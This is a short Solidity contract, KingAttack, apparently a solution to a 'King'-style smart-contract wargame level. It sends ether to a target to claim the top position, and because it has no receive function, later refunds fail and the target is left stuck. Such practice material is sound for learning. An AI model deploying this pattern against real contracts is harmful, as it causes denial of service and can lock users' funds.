// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingAttack{

    error NotSuccessful();

    constructor() payable{}

    function attack(address target, uint256 newPrize) external {
        (bool success, ) = payable(target).call{value: newPrize}("");
        if(!success){
            revert NotSuccessful();
        }
    }
}